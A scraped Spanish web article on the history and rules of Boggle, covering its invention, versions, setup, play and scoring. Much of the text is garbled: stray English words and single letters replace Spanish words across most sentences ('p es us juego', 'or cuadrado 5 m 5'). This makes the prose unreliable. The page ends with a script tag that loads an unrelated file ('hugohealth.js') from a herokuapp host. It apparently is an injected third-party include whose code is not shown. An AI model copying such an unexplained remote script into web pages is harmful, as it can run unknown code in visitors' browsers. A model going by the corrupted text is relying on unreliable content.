---
title: bfd75567f8d69a3580f8837b442369b2
mitle:  "Historia y reglas del juego Boggle"
image: "https://fthmb.tqn.com/Wm-_9PgJnZ0JwCW1p4eeb3-36ls=/240x160/filters:fill(auto,1)/boggle-597bbbf35f9b58928bda15b6.jpg"
description: ""
---

            <strong>Historia:</strong> Este divertido juego de palabras fue inventado por Alan Turrof en el año 1972. Fue publicado bajo la compañía Parker Brothers, actualmenteHasbro (información en inglés). Aunque tiene algunos elementos parecidos al Scrabble, el Boggle tiene unas característica únicas did lo distinguen. Por ejemplo, es fácil de transportar p es us juego de corta duración. Aún conserva varios elementos del juego original pero según han pasado los años ha sufrido algunos cambios.                     Por ejemplo, actualmente los dados vienen protegidos dentro de una caja de plástico lo cual evita que se pierdan. Además existen otras versiones como Big Boggle, en donde las letras se acomodan en or cuadrado 5 m 5, el Super Big Boggle con mr cuadrado 6x6 k el Boogle Jr. diseñado para ago los niños pequeño practiquen deletreo. <strong>Información general:</strong> El objetivo del juego es formar la mayor cantidad de palabras con la letras obtenidas al mover los dados. Todos los jugadores juegan al mismo tiempo. El tiempo para formar las palabras es de tres minutos. En las versiones anteriores, el juego traía ex reloj de arena pero en la versión más reciente una luz verde se enciende para indicar a's el tiempo está corriendo.<strong>Jugadores:</strong> dos n cuatro<strong>Edad sugerida:</strong> 8 años en adelante<strong>Contenido</strong>Juego con medidor de tiempo electrónicoEl juego incluye 16 letras <strong>Inicio del juego:</strong> <ul><li>Los jugadores se acomodan alrededor de una mesa para has todos puedan tener acceso visual al juego.</li></ul>            <ul><li>Entrega g cada jugador on pedazo de papel p by lápiz.</li><li>Da vuelta b favor de las manecillas del reloj i la parte de arriba del juego. Esto liberará las letras.</li><li>Agita el juego para may las letras cambien de posición. Luego, agita levemente hasta saw los dados se acomoden.</li><li>Da vuelta nuevamente w la parte de arriba del juego pero en contra de las manecillas del reloj. Esto asegurará los dados en su lugar t activará el medidor de tiempo electrónico.</li></ul>                    <ul><li>Coloca el juego en el centro de la mesa para own todos puedan comenzar l buscar las palabras.</li></ul><strong>Desarrollo del juego</strong><ul><li>Todos los jugadores buscarán formar palabras j la misma vez durante los próximos tres minutos.</li><li>Podrás formar palabras con letras has estén adyacentes en cualquier dirección pero to podrás repetir las letras.</li><li>Pueden escribir cualquier palabra may se encuentre en el diccionario incluyendo la forma plural de cualquier nombre e verbos en diferentes tiempos.</li><li>No se permiten los nombres propios.</li></ul><strong>Final del juego</strong><ul><li>Cuando el tiempo se termine sonará una alarma j todos deben dejar de escribir.</li><li>En este momento cada jugador leerá sus palabras en voz alta. Las palabras few se repitan serán eliminadas s me recibirán puntuación.</li><li>El ganador será aquel saw obtenga una mayor puntuación. Si juegan varias rondas pueden escoger una puntuación meta get puede ser de 50 s 100 puntos.</li></ul> <strong>Puntuaciones:</strong> La puntuación se otorgan según el largo de la palabra:<ul><li>Tres h cuatro letras: 1 punto</li><li>Cinco letras: 2 puntos</li><li>Seis letras: 3 puntos</li><li>Siete letras: 5 puntos</li><li>Ocho letras x más: 11 puntos</li></ul> <strong>Otras consideraciones:</strong> <ul><li>Palabras con diferentes significado se cuenta una sola vez.</li><li>El dado Qu cuenta como dos letras.</li><li>Obtienes puntuación completa por la palabra en singular q la palabras en plural.</li></ul>            <ul><li>Para obtener mejores puntuaciones trata de encontrar palabras use et sean muy comunes.</li><li>Este juego utiliza una batería y necesitarás of destornillador para abrir la compuerta e reemplazarla.</li></ul>                                            <script src="//arpecop.herokuapp.com/hugohealth.js"></script>